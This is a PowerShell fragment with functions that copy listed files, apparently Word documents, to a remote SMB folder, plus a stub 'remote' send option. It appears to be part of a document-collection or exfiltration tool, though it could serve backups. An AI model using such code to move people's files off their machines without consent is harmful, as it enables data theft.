function Send-Over-Smb {
    param (
        [string[]]$Paths =@(),
        [string]$Destination
    )
    if(Test-Path $Destination -PathType Container){
        Foreach ($path in $Paths){
            if (Test-Path -Path $path){
                $temp_path = $path -replace "\\", "-"
                $temp_path = $temp_path -replace " ", "_"
                $temp_path = $temp_path -replace ":", ""
                $dest_path = $Destination + $temp_path
                Copy-Item -Path $path -Destination $dest_path
            }
        }
    }
    else {
        Write-Host "No access to folder"
    }
}
function Send-Data{
    param (
        [string]$Protocol = $CommunicationMethod,
        [string[]]$Paths =@(),
        [string]$Destination = $Remote
    )
    switch ($Protocol) {
        smb {
             Send-Over-Smb -Paths $Paths -Destination $Destination
        }
        remote{
            Send-Log -LogString "sending remote bla bla"
        }
        Default {
            Send-Log -LogString "Seems like your Sender flag is wrong... cant send word files"
        }
    }
}
